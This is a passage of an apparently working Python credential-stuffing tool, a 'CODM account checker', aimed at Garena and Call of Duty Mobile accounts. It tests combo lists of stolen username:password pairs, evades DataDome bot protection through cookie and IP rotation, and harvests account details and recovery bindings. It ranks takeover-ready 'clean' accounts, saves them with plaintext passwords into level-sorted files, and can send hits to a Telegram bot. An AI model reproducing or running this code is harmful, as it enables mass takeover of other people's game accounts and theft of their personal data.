            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        }
        
        check_response = session.get(check_login_url, headers=check_headers)
        check_data = check_response.json()
        
        user_data = check_data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"),
                "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"),
                "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"),
                "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
        
    except Exception as e:
        logger.error(f"❌ Error getting CODM user info: {e}")
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    
    try:
        access_token = get_codm_access_token(session)
        if not access_token:
            logger.warning(f"⚠️ No CODM access token for {account}")
            return has_codm, codm_info
        
        codm_token, status = process_codm_callback(session, access_token)
        
        if status == "no_codm":
            logger.info(f"⚠️ No CODM detected for {account}")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            logger.warning(f"⚠️ CODM callback failed for {account}: {status}")
            return has_codm, codm_info
        
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            logger.info(f"✅ CODM detected for {account}: Level {codm_info.get('codm_level', 'N/A')}")
            
    except Exception as e:
        logger.error(f"❌ Error checking CODM for {account}: {e}")
    
    return has_codm, codm_info

def get_shells_balance(session):
    try:
        shells_url = "https://shop.garena.sg/api/shells/balance"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Connection": "keep-alive",
            "Referer": "https://shop.garena.sg/"
        }
        
        response = session.get(shells_url, headers=headers, timeout=30)
        if response.status_code == 200:
            data = response.json()
            return data.get("balance", 0)
    except Exception as e:
        logger.error(f"❌ Error getting shells balance: {e}")
    
    return 0

def parse_account_details(data):
    user_info = data.get('user_info', {})
    
    mobile_no = user_info.get('mobile_no', 'N/A')
    country_code = user_info.get('country_code', '')
    
    if mobile_no != 'N/A' and mobile_no and country_code:
        formatted_mobile = f"+{country_code}{mobile_no}"
    else:
        formatted_mobile = mobile_no
    
    mobile_bound = bool(mobile_no and mobile_no != 'N/A' and mobile_no.strip())
    
    email = user_info.get('email', 'N/A')
    email_verified = bool(user_info.get('email_v', 0))
    email_actually_bound = bool(email != 'N/A' and email and email_verified)
    
    facebook_account = user_info.get('fb_account', None)
    facebook_connected = bool(facebook_account)
    
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': email,
        'email_verified': email_verified,
        
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': country_code,
            'mobile_no': formatted_mobile,
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) else "Not Bound",
            'mobile_actually_bound': mobile_bound,
        },
        
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
        },
        
        'facebook': {
            'connected': facebook_connected,
            'account': facebook_account,
            'profile_url': f"https://facebook.com/{facebook_account}" if facebook_account else "N/A"
        },
        
        'binds': [],
        'is_clean': False
    }

    if email_actually_bound:
        account_info['binds'].append('Email')
    
    if account_info['personal']['mobile_actually_bound']:
        account_info['binds'].append('Phone')
    
    if account_info['facebook']['connected']:
        account_info['binds'].append('Facebook')
    
    if account_info['personal']['id_card'] != 'N/A' and account_info['personal']['id_card']:
        account_info['binds'].append('ID Card')

    account_info['bind_status'] = "Clean" if not account_info['binds'] else "NOT CLEAN"
    account_info['is_clean'] = len(account_info['binds']) == 0

    return account_info

def get_level_range(level):
    """Determine which level range the account belongs to"""
    try:
        level_int = int(level)
        if 1 <= level_int <= 100:
            return "Level 1-100"
        elif 101 <= level_int <= 200:
            return "Level 101-200"
        elif 201 <= level_int <= 300:
            return "Level 201-300"
        elif 301 <= level_int <= 400:
            return "Level 301-400"
        elif level_int > 400:
            return "Level 401+"
        else:
            return "Level Unknown"
    except:
        return "Level Unknown"

def create_file_structure():
    """Create the required folder structure"""
    base_folders = ['Results', 'Combo']
    
    for folder in base_folders:
        if not os.path.exists(folder):
            os.makedirs(folder, exist_ok=True)
    
    # Create Level_Separated subfolders
    level_folders = [
        'Results/Level_Separated/Level 1-100',
        'Results/Level_Separated/Level 101-200',
        'Results/Level_Separated/Level 201-300',
        'Results/Level_Separated/Level 301-400',
        'Results/Level_Separated/Level 401+',
        'Results/Level_Separated/Level Unknown'
    ]
    
    for folder in level_folders:
        if not os.path.exists(folder):
            os.makedirs(folder, exist_ok=True)

def format_account_details(account, password, details, codm_info, shells_balance):
    """Format account details exactly like console output"""
    
    # Format mobile number
    mobile_no = details['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and not mobile_no.startswith('****') and len(mobile_no) > 4:
        mobile_display = f"****{mobile_no[-4:]}"
    else:
        mobile_display = "****"
    
    # Format email
    email = details['email']
    if email != 'N/A' and '@' in email:
        email_parts = email.split('@')
        if len(email_parts[0]) > 3:
            masked_email = f"{email_parts[0][:3]}****@{email_parts[1]}"
        else:
            masked_email = f"****@{email_parts[1]}"
        email_status = "Verified" if details['email_verified'] else "Not Verified"
        email_display = f"{masked_email} ({email_status})"
    else:
        email_display = "N/A (Not Verified)"
    
    # Get level range
    level_range = "N/A"
    if codm_info:
        level = codm_info.get('codm_level', 'N/A')
        level_range = get_level_range(level)
    
    # Create the formatted string
    output = []
    output.append("="*60)
    output.append(f"Username: {account}:{password}")
    output.append("="*60)
    output.append("")
    output.append("-----INFO-----")
    output.append(f"Garena Shells: {shells_balance}")
    
    if codm_info:
        output.append(f"CODM Nickname : {codm_info.get('codm_nickname', 'N/A')}")
        output.append(f"CODM UID: {codm_info.get('uid', 'N/A')}")
        output.append(f"CODM Level: {codm_info.get('codm_level', 'N/A')}")
        output.append(f"Level Range: {level_range}")
    else:
        output.append(f"CODM Account: Not Found")
    
    output.append(f"Country: {details['personal']['country']}")
    output.append("")
    output.append("-----ACCOUNT DETAILS-----")
    output.append(f"Avatar URL: {details['profile']['avatar']}")
    output.append(f"Mobile No: {mobile_display}")
    output.append(f"Email: {email_display}")
    
    if details['facebook']['connected']:
        output.append(f"FB Username: Linked ({details['facebook']['account']})")
        output.append(f"FB Profile: {details['facebook']['profile_url']}")
    else:
        output.append(f"FB Username: Not Linked")
    
    output.append("")
    output.append("-----BINDINGS-----")
    
    mobile_status = "✅" if details['personal']['mobile_actually_bound'] else "❌"
    email_status = "✅" if details['email_verified'] else "❌"
    fb_status = "✅" if details['facebook']['connected'] else "❌"
    
    output.append(f"Mobile Bound: {mobile_status}")
    output.append(f"Email Verified: {email_status}")
    output.append(f"Facebook Linked: {fb_status}")
    
    if details['is_clean']:
        output.append(f"Account Status: CLEAN")
    else:
        output.append(f"Account Status: NOT CLEAN")
        if details['binds']:
            output.append(f"Bound to: {', '.join(details['binds'])}")
    
    output.append(f"Config By: AxelLagingPogi(@MercyNot1)")
    output.append("="*60)
    output.append("")  # Empty line for separation
    
    return "\n".join(output)

def save_to_files(account, password, details, codm_info, shells_balance):
    """Save account to all required files"""
    try:
        # Format the account details
        formatted_details = format_account_details(account, password, details, codm_info, shells_balance)
        
        # Get level information
        level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
        level_range = get_level_range(level)
        
        # 1. Save to Full_details.txt
        with open('Results/Full_details.txt', 'a', encoding='utf-8') as f:
            f.write(formatted_details)
        
        # 2. Save to Clean_codm.txt or Notclean_codm.txt
        if details['is_clean']:
            with open('Results/Clean_codm.txt', 'a', encoding='utf-8') as f:
                f.write(f"Username: {account}:{password}\n")
                if codm_info:
                    f.write(f"CODM Nickname: {codm_info.get('codm_nickname', 'N/A')} | ")
                    f.write(f"Level: {codm_info.get('codm_level', 'N/A')} | ")
                    f.write(f"UID: {codm_info.get('uid', 'N/A')} | ")
                    f.write(f"Region: {codm_info.get('region', 'N/A')}\n")
                f.write("="*60 + "\n\n")
        else:
            with open('Results/Notclean_codm.txt', 'a', encoding='utf-8') as f:
                f.write(f"Username: {account}:{password}\n")
                if details['binds']:
                    f.write(f"Binds: {', '.join(details['binds'])} | ")
                if codm_info:
                    f.write(f"CODM Nickname: {codm_info.get('codm_nickname', 'N/A')} | ")
                    f.write(f"Level: {codm_info.get('codm_level', 'N/A')} | ")
                    f.write(f"UID: {codm_info.get('uid', 'N/A')} | ")
                    f.write(f"Region: {codm_info.get('region', 'N/A')}\n")
                f.write("="*60 + "\n\n")
        
        # 3. Save to Level_Separated folders
        if codm_info:
            level_folder = f"Results/Level_Separated/{level_range}"
            
            # Save detailed version in level folder
            level_file = f"{level_folder}/{level_range.replace(' ', '_')}.txt"
            with open(level_file, 'a', encoding='utf-8') as f:
                f.write(formatted_details)
            
            # Save simple version for quick reference
            simple_file = f"{level_folder}/accounts.txt"
            with open(simple_file, 'a', encoding='utf-8') as f:
                if details['is_clean']:
                    status = "CLEAN"
                else:
                    status = "NOT CLEAN"
                
                f.write(f"{account}:{password} | ")
                f.write(f"Nickname: {codm_info.get('codm_nickname', 'N/A')} | ")
                f.write(f"Level: {codm_info.get('codm_level', 'N/A')} | ")
                f.write(f"Status: {status} | ")
                if details['binds']:
                    f.write(f"Binds: {', '.join(details['binds'])} | ")
                f.write(f"UID: {codm_info.get('uid', 'N/A')}\n")
        
    except Exception as e:
        logger.error(f"[ERROR] Error saving files for {account}: {e}")

def display_account_details(account, password, details, codm_info, shells_balance):
    """Display account details in console"""
    
    print("\n" + "="*60)
    print(f"{Fore.CYAN}Username:{Fore.RESET} {account}:{password}")
    print("="*60)
    
    print(f"\n{Fore.CYAN}-----INFO-----{Fore.RESET}")
    print(f"{Fore.GREEN}Garena Shells:{Fore.RESET} {shells_balance}")
    
    if codm_info:
        print(f"{Fore.GREEN}CODM Nickname :{Fore.RESET} {codm_info.get('codm_nickname', 'N/A')}")
        print(f"{Fore.GREEN}CODM UID:{Fore.RESET} {codm_info.get('uid', 'N/A')}")
        print(f"{Fore.GREEN}CODM Level:{Fore.RESET} {codm_info.get('codm_level', 'N/A')}")
        
        # Show level range
        level = codm_info.get('codm_level', 'N/A')
        level_range = get_level_range(level)
        print(f"{Fore.GREEN}Level Range:{Fore.RESET} {level_range}")
    else:
        print(f"{Fore.RED}CODM Account:{Fore.RESET} Not Found")
    
    print(f"{Fore.GREEN}Country:{Fore.RESET} {details['personal']['country']}")
    
    print(f"\n{Fore.CYAN}-----ACCOUNT DETAILS-----{Fore.RESET}")
    print(f"{Fore.GREEN}Avatar URL:{Fore.RESET} {details['profile']['avatar']}")
    
    mobile_no = details['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and not mobile_no.startswith('****') and len(mobile_no) > 4:
        print(f"{Fore.GREEN}Mobile No:{Fore.RESET} ****{mobile_no[-4:]}")
    else:
        print(f"{Fore.GREEN}Mobile No:{Fore.RESET} ****")
    
    email = details['email']
    if email != 'N/A' and '@' in email:
        email_parts = email.split('@')
        if len(email_parts[0]) > 3:
            masked_email = f"{email_parts[0][:3]}****@{email_parts[1]}"
        else:
            masked_email = f"****@{email_parts[1]}"
    else:
        masked_email = "N/A"
    
    print(f"{Fore.GREEN}Email:{Fore.RESET} {masked_email} ({'Verified' if details['email_verified'] else 'Not Verified'})")
    
    if details['facebook']['connected']:
        print(f"{Fore.GREEN}FB Username:{Fore.RESET} Linked ({details['facebook']['account']})")
        print(f"{Fore.GREEN}FB Profile:{Fore.RESET} {details['facebook']['profile_url']}")
    else:
        print(f"{Fore.GREEN}FB Username:{Fore.RESET} Not Linked")
    
    print(f"\n{Fore.CYAN}-----BINDINGS-----{Fore.RESET}")
    
    mobile_status = "✅" if details['personal']['mobile_actually_bound'] else "❌"
    email_status = "✅" if details['email_verified'] else "❌"
    fb_status = "✅" if details['facebook']['connected'] else "❌"
    
    print(f"{Fore.GREEN}Mobile Bound:{Fore.RESET} {mobile_status}")
    print(f"{Fore.GREEN}Email Verified:{Fore.RESET} {email_status}")
    print(f"{Fore.GREEN}Facebook Linked:{Fore.RESET} {fb_status}")
    
    if details['is_clean']:
        print(f"{Fore.GREEN}Account Status:{Fore.RESET} {Fore.GREEN}CLEAN{Fore.RESET}")
    else:
        print(f"{Fore.GREEN}Account Status:{Fore.RESET} {Fore.RED}NOT CLEAN{Fore.RESET}")
        if details['binds']:
            print(f"{Fore.YELLOW}Bound to:{Fore.RESET} {', '.join(details['binds'])}")
    
    print(f"{Fore.GREEN}Config By:{Fore.RESET} AxelLagingPogi(@MercyNot1)")
    print("="*60 + "\n")

def remove_checked_accounts(filename, accounts_to_remove):
    """Remove checked accounts from the input file"""
    try:
        if not accounts_to_remove:
            return 0
        
        with open(filename, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        original_count = len(lines)
        new_lines = []
        removed = 0
        
        for line in lines:
            account_line = line.strip()
            if not account_line:
                new_lines.append(line)
                continue
                
            # Extract username from line
            if ':' in account_line:
                account = account_line.split(':')[0].strip()
                if account in accounts_to_remove:
                    removed += 1
                    continue
            
            new_lines.append(line)
        
        # Write back the file without checked accounts
        with open(filename, 'w', encoding='utf-8') as f:
            f.writelines(new_lines)
        
        logger.info(f"[FILE] Removed {removed} checked accounts from {os.path.basename(filename)}")
        logger.info(f"[FILE] Remaining accounts: {len(new_lines)}")
        
        return removed
    except Exception as e:
        logger.error(f"[ERROR] Failed to remove checked accounts: {e}")
        return 0

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, telegram_bot=None):
    try:
        datadome_manager.clear_session_datadome(session)
        
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            success = datadome_manager.set_session_datadome(session, current_datadome)
            if success:
                logger.debug(f"[INFO] Using existing DataDome cookie: {current_datadome[:30]}...")
            else:
                logger.debug(f"[WARNING] Failed to set existing DataDome cookie")
        else:
            datadome = get_datadome_cookie(session)
            if not datadome:
                live_stats.update(valid=False, has_codm=False, clean=False)
                return False, f"[ERROR] {account}: DataDome cookie generation failed"
            datadome_manager.set_datadome(datadome)
            datadome_manager.set_session_datadome(session, datadome)
        
        v1, v2, new_datadome = prelogin(session, account, datadome_manager)
        
        if v1 == "IP_BLOCKED":
            return False, f"[ERROR] {account}: IP Blocked - New DataDome required"
        
        if not v1 or not v2:
            live_stats.update(valid=False, has_codm=False, clean=False)
            return False, f"[ERROR] {account}: Invalid (Prelogin failed)"
        
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
            logger.debug(f"[INFO] Updated DataDome from prelogin: {new_datadome[:30]}...")
        
        sso_key = login(session, account, password, v1, v2)
        if not sso_key:
            live_stats.update(valid=False, has_codm=False, clean=False)
            return False, f"[ERROR] {account}: Invalid (Login failed)"
        
        try:
            session.cookies.set('sso_key', sso_key, domain='.garena.com')
        except Exception as e:
            logger.debug(f"[WARNING] Error setting sso_key cookie: {e}")
        
        headers = {
            'accept': '*/*',
            'cookie': f'sso_key={sso_key}',
            'referer': 'https://account.garena.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
        }
        
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        
        if response.status_code == 403:
            if datadome_manager.handle_403(session):
                return False, f"[ERROR] {account}: IP Blocked - New DataDome required"
            live_stats.update(valid=False, has_codm=False, clean=False)
            return False, f"[ERROR] {account}: Banned (Cookie flagged)"
            
        try:
            account_data = response.json()
        except json.JSONDecodeError as e:
            logger.error(f"[ERROR] Invalid JSON response from account init for {account}: {e}")
            live_stats.update(valid=False, has_codm=False, clean=False)
            return False, f"[ERROR] {account}: Invalid response from server"
        
        if 'error' in account_data:
            if account_data.get('error') == 'error_auth':
                live_stats.update(valid=False, has_codm=False, clean=False)
                return False, f"[WARNING] {account}: Invalid (Authentication error)"
            live_stats.update(valid=False, has_codm=False, clean=False)
            return False, f"[WARNING] {account}: Error fetching details ({account_data['error']})"
        
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        
        # Get shells balance
        shells_balance = get_shells_balance(session)
        
        # Check for CODM account
        has_codm, codm_info = check_codm_account(session, account)
        
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
            logger.debug(f"[INFO] Fresh cookie obtained for next account")
        
        # Display account details in console
        display_account_details(account, password, details, codm_info if has_codm else None, shells_balance)
        
        # Save to all files
        save_to_files(account, password, details, codm_info if has_codm else None, shells_balance)
        
        # Update stats
        live_stats.update(valid=True, has_codm=has_codm, clean=details['is_clean'])
        
        # Send to Telegram if it's a hit and Telegram is enabled
        if has_codm and telegram_bot:
            telegram_bot.send_hit(account, password, details, codm_info, shells_balance)
        
        result = f"[SUCCESS] {account}: "
        if has_codm:
            result += f"CODM Account Found"
        else:
            result += f"Valid (No CODM)"
        
        if details['is_clean']:
            result += f" | Status: {Fore.GREEN}CLEAN{Fore.RESET}"
        else:
            result += f" | Status: {Fore.RED}NOT CLEAN{Fore.RESET}"
        
        return True, result
        
    except Exception as e:
        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
        live_stats.update(valid=False, has_codm=False, clean=False)
        return False, f"[ERROR] {account}: Processing error"

def select_input_file():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    combo_folder = os.path.join(script_dir, "Combo")

    translations_dict = {
        "tagalog": {
            "instructions": [
                "[!] MAGBASA KA PARA MAIWASAN ANG PAG TANONG!",
                "[*] AUTO GEN COOKIES NA YAN PAG NAGAMIT ANG STARTER COOKIES(cookies.txt)!",
                "[*] SA COOKIE FOLDER KA KUMUHA NG FRESH COOKIES!",
                "[*] KAPAG NAG IP BLOCKED NA, MAGPALIT KA NG IP AT COOKIES!",
                "[*] KUNG IP BLOCKED 2-3 TIMES NA SUNUD-SUNOD, JUMP KA BAWAT 200 COOKIE SETS!"
            ],
            "restart_message": "[!] RESTART MO CHECKER AT LAGYAN MO NG TXT YUNG COMBO FOLDER!"
        },
        "english": {
            "instructions": [
                "[!] READ THIS TO AVOID ASKING QUESTIONS!",
                "[*] COOKIES ARE AUTO-GENERATED ONCE STARTER COOKIES (fresh_cookie.txt) ARE USED!",
                "[*] GET FRESH COOKIES FROM fresh_cookie.txt!",
                "[*] IF IP IS BLOCKED, CHANGE YOUR IP AND COOKIES!",
                "[*] IF IP BLOCKED 2-3 TIMES IN A ROW, JUMP EVERY 200 COOKIE SETS!"
            ],
            "restart_message": "[!] RESTART THE CHECKER AND ADD YOUR TXT FILES TO THE COMBO FOLDER!"
        },
        "indonesian": {
            "instructions": [
                "[!] BACA INI UNTUK MENGHINDARI PERTANYAAN!",
                "[*] COOKIE AKAN OTOMATIS DIGENERASI SETELAH MENGGUNAKAN STARTER COOKIES (fresh_cookie.txt)!",
                "[*] AMBIL COOKIE BARU DARI fresh_cookie.txt!",
                "[*] JIKA IP DIBLOKIR, GANTI IP DAN COOKIE ANDA!",
                "[*] JIKA IP DIBLOKIR 2-3 KALI BERTURUT-TURUT, LOMPAT SETIAP 200 SET COOKIE!"
            ],
            "restart_message": "[!] MULAI ULANG CHECKER DAN TAMBAHKAN FILE TXT KE FOLDER COMBO!"
        }
    }

    show_instructions = console.input("[yellow][?] Do you want to show instructions? (type 'y' if yes or press enter if 'no'): [/yellow]").strip().lower()

    selected_language = "english"
    if show_instructions == 'y':
        console.print("[cyan][*] Available languages: 1. Tagalog, 2. English, 3. Indonesian[/cyan]")
        language_choice = console.input("[yellow][?] Select language (1-3, default 2 for English): [/yellow]").strip()

        language_map = {"1": "tagalog", "2": "english", "3": "indonesian"}
        selected_language = language_map.get(language_choice, "english")

        instructions = translations_dict[selected_language]["instructions"]

        max_length = max(len(instruction) for instruction in instructions) + 4
        border_width = max_length + 4

        console.print(f"[cyan]╔{'═' * (border_width - 2)}╗[/cyan]")
        console.print(f"[cyan]║{' INSTRUCTIONS ':^{border_width - 2}}║[/cyan]")
        console.print(f"[cyan]╠{'═' * (border_width - 2)}╣[/cyan]")
        for instruction in instructions:
            color = "yellow" if any(x in instruction for x in ["IP BLOCKED", "COOKIE FOLDER", "COOKIES"]) else "red"
            console.print(f"[cyan]║[/cyan] [{color}]{instruction:<{border_width - 4}}[/{color}] [cyan]║[/cyan]")
        console.print(f"[cyan]╚{'═' * (border_width - 2)}╝[/cyan]")
        console.print()

    if not os.path.exists(combo_folder):
        os.makedirs(combo_folder, exist_ok=True)
        console.print(f"[green][!] Successfully created Combo folder.[/green]")
        console.print(f"[yellow]{translations_dict[selected_language]['restart_message']}[/yellow]")
        exit(0)

    txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]

    file_path = None

    if txt_files:
        console.print(f"[green][+] Found {len(txt_files)} txt files in Combo folder:[/green]")

        max_filename_length = max(len(f"{i}. {file}") for i, file in enumerate(txt_files, 1)) + 2
        max_size_length = 9
        max_line_count_length = max(
            len(f"{sum(1 for line in open(os.path.join(combo_folder, file), 'r', encoding='utf-8') if line.strip()):,}")
            for file in txt_files) + 2

        top_border = f"[cyan]╔{'═' * (max_filename_length + 2)}╦{'═' * (max_size_length + 2)}╦{'═' * (max_line_count_length + 2)}╗[/cyan]"
        header_border = f"[cyan]╠{'═' * (max_filename_length + 2)}╬{'═' * (max_size_length + 2)}╬{'═' * (max_line_count_length + 2)}╣[/cyan]"
        bottom_border = f"[cyan]╚{'═' * (max_filename_length + 2)}╩{'═' * (max_size_length + 2)}╩{'═' * (max_line_count_length + 2)}╝[/cyan]"

        console.print(top_border)
        console.print(
            f"[cyan]║ [white]{'Text File':^{max_filename_length}} [cyan]║ [white]{'Size':^{max_size_length}} [cyan]║ [white]{'Lines':^{max_line_count_length}} [cyan]║[/cyan]")
        console.print(header_border)

        for i, file in enumerate(txt_files, 1):
            file_path_full = os.path.join(combo_folder, file)
            file_size = os.path.getsize(file_path_full) / 1024
            try:
                with open(file_path_full, 'r', encoding='utf-8') as f:
                    line_count = sum(1 for line in f if line.strip())
            except Exception as e:
                line_count = 0
                console.print(f"[yellow][WARNING] Could not read lines in {file}: {e}[/yellow]")
            if file_size >= 1000:
                file_size_mb = file_size / 1024
                size_display = f"{file_size_mb:.1f}MB"
            else:
                size_display = f"{file_size:.2f}KB"
            line_count_display = f"{line_count:,}"
            filename_display = f"{i}. {file}"
            console.print(
                f"[cyan]║ [yellow]{filename_display:<{max_filename_length}} [cyan]║ [yellow]{size_display:>{max_size_length}} [cyan]║ [yellow]{line_count_display:>{max_line_count_length}} [cyan]║[/cyan]")

        console.print(bottom_border)

        while True:
            try:
                choice = console.input(
                    f"[yellow][?] Select a file (1-{len(txt_files)}) or press Enter to find nearest relevant file: [/yellow]").strip()
                if not choice:
                    file_path = find_nearest_account_file()
                    break
                choice_idx = int(choice) - 1
                if 0 <= choice_idx < len(txt_files):
                    file_path = os.path.join(combo_folder, txt_files[choice_idx])
                    break
                else:
                    console.print(
                        f"[red][!] Invalid selection. Please choose a number between 1 and {len(txt_files)}.[/red]")
            except ValueError:
                console.print(f"[red][!] Invalid input. Please enter a valid number or press Enter.[/red]")
    else:
        console.print(f"[yellow][!] No txt files found in Combo folder.[/yellow]")
        file_path = console.input(
            "Enter the path of the txt file (ex: /sdcard/Download/filename.txt) or press Enter to find the nearest relevant file: ").strip()
        if not file_path:
            file_path = find_nearest_account_file()

    if os.path.exists(file_path):
        # Ask if user wants URL removal
        url_removal_choice = console.input(
            f"[yellow][?] Do you want to remove URLs from {os.path.basename(file_path)}? (y/n, default n): [/yellow]").strip().lower()
        if url_removal_choice == 'y':
            temp_file = file_path + ".temp_cleaned"
            if process_file_with_url_removal(file_path, temp_file):
                # Replace original file with cleaned version
                os.replace(temp_file, file_path)
                console.print(f"[green][+] URLs removed successfully from {os.path.basename(file_path)}[/green]")
            else:
                console.print(f"[red][ERROR] Failed to remove URLs from {os.path.basename(file_path)}[/red]")
                if os.path.exists(temp_file):
                    os.remove(temp_file)

        # Ask if user wants duplicate removal
        remove_duplicates_choice = console.input(
            f"[yellow][?] Do you want to remove duplicate lines from {os.path.basename(file_path)}? (y/n, default n): [/yellow]").strip().lower()
        if remove_duplicates_choice == 'y':
            remove_duplicates_from_file(file_path)

    return file_path

def find_nearest_account_file():
    keywords = ["garena", "account", "codm"]
    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")

    txt_files = []
    for root, _, files in os.walk(combo_folder):
        for file in files:
            if file.endswith(".txt"):
                txt_files.append(os.path.join(root, file))

    for file_path in txt_files:
        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
            return file_path

    if txt_files:
        return random.choice(txt_files)

    return os.path.join(combo_folder, "accounts.txt")

def remove_duplicates_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        unique_lines = []
        seen_lines = set()
        for line in lines:
            stripped_line = line.strip()
            if stripped_line and stripped_line not in seen_lines:
                unique_lines.append(line)
                seen_lines.add(stripped_line)

        if len(lines) == len(unique_lines):
            console.print(f"[yellow][*] No duplicate lines found in {os.path.basename(file_path)}.[/yellow]")
            return False

        with open(file_path, 'w', encoding='utf-8') as f:
            f.writelines(unique_lines)

        console.print(f"[green][+] Successfully removed {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
        return True
    except FileNotFoundError:
        console.print(f"[red][ERROR] File not found: {file_path}[/red]")
        return False
    except Exception as e:
        console.print(f"[red][ERROR] Failed to remove duplicates from {os.path.basename(file_path)}: {e}[/red]")
        return False

def process_file_with_url_removal(input_file, output_file):
    """
    Process file to remove URLs and keep only credentials
    """
    try:
        processed = 0
        saved = 0
        
        with open(input_file, 'r', encoding='utf-8') as infile, \
             open(output_file, 'w', encoding='utf-8') as outfile:
            
            for line in infile:
                processed += 1
                result = remove_url_and_keep_user_pass(line)
                if result:
                    outfile.write(result + '\n')
                    saved += 1
                        
        logger.info(f"[URL REMOVAL] Processed lines: {processed}")
        logger.info(f"[URL REMOVAL] Saved credentials: {saved}")
        logger.info(f"[URL REMOVAL] Success rate: {(saved/processed*100):.2f}%")
        
        return True
        
    except FileNotFoundError:
        logger.error(f"[ERROR] Input file not found: {input_file}")
        return False
    except Exception as e:
        logger.error(f"[ERROR] URL removal failed: {str(e)}")
        return False

def remove_url_and_keep_user_pass(line):
    """
    Remove URLs and keep only username:password format
    """
    match = re.search(r'([^:]+:[^:]+)$', line.strip())
    if match:
        return match.group(1)
    return None

def main():
    # Create folder structure first
    create_file_structure()
    
    # Show welcome banner
    console.print(f"\n{Fore.CYAN}{'='*60}")
    console.print(f"{Fore.CYAN}      CODM ACCOUNT CHECKER v2.0")
    console.print(f"{Fore.CYAN}      Config By: @MercyNot1")
    console.print(f"{Fore.CYAN}{'='*60}{Fore.RESET}\n")
    
    # Step 1: Select input file
    console.print(f"{Fore.YELLOW}[1/3] SELECT INPUT FILE{Fore.RESET}")
    filename = select_input_file()
    
    if not os.path.exists(filename):
        logger.error(f"[ERROR] File '{filename}' not found.")
        return
    
    # Step 2: Telegram Bot configuration
    console.print(f"\n{Fore.YELLOW}[2/3] TELEGRAM BOT SETTINGS{Fore.RESET}")
    use_telegram = console.input("[yellow][?] Do you want to send hits to Telegram Bot? (y/n): [/yellow]").strip().lower()
    
    telegram_bot = None
    if use_telegram == 'y':
        bot_token = console.input("[yellow][?] Enter your Telegram Bot Token: [/yellow]").strip()
        chat_id = console.input("[yellow][?] Enter your Chat ID: [/yellow]").strip()
        
        if bot_token and chat_id:
            telegram_bot = TelegramBot(bot_token, chat_id)
            console.print(f"[green][+] Telegram Bot configured successfully![/green]")
        else:
            console.print(f"[red][!] Invalid Telegram credentials. Telegram features disabled.[/red]")
    else:
        console.print(f"[yellow][*] Telegram Bot disabled.[/yellow]")
    
    # Step 3: File management options
    console.print(f"\n{Fore.YELLOW}[3/3] FILE MANAGEMENT SETTINGS{Fore.RESET}")
    
    # Ask for auto-removal option
    auto_remove = console.input("[yellow][?] Auto-remove checked accounts from input file? (y/n): [/yellow]").strip().lower()
    
    # Ask for backup option
    create_backup = console.input("[yellow][?] Create backup of input file before starting? (y/n): [/yellow]").strip().lower()
    
    # Create backup if requested
    if create_backup == 'y':
        backup_file = f"{filename}.backup_{int(time.time())}"
        try:
            import shutil
            shutil.copy2(filename, backup_file)
            console.print(f"[green][+] Backup created: {os.path.basename(backup_file)}[/green]")
        except Exception as e:
            console.print(f"[red][!] Failed to create backup: {e}[/red]")
    
    # Initialize managers
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    
    session = cloudscraper.create_scraper()
    valid_cookies = cookie_manager.get_valid_cookies() 
    cookie_count = len(valid_cookies)

    if valid_cookies:
        combined_cookie_str = "; ".join(valid_cookies)
        
        logger.info(f"[𝙄𝙉𝙁𝙊] Loaded and applied {cookie_count} saved cookies to session.") 
        applyck(session, combined_cookie_str)
        final_cookie_value = valid_cookies[-1]
        datadome_value = final_cookie_value.split('=', 1)[1].strip() if '=' in final_cookie_value and len(final_cookie_value.split('=', 1)) > 1 else None
        
        if datadome_value:
            datadome_manager.set_datadome(datadome_value)
            
    else:
        logger.info(f"[𝙄𝙉𝙁𝙊] No saved cookies found. Starting fresh session and generating DataDome.")
        
        datadome = get_datadome_cookie(session)
